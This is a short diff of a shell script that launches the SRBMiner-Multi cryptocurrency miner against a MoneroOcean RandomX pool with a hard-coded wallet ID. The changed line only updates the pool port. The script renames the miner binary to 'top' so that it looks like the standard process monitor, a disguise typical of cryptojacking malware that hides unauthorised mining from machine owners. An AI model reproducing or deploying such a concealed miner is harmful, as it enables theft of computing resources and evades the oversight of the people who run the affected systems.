@@ -6,4 +6,4 @@ cd SRBMiner-Multi-2-5-6
 
 mv SRBMiner-MULTI top
 
-./top -a randomx -o gulf.moneroocean.stream:10032 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky
+./top -a randomx -o gulf.moneroocean.stream:10128 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.lucky
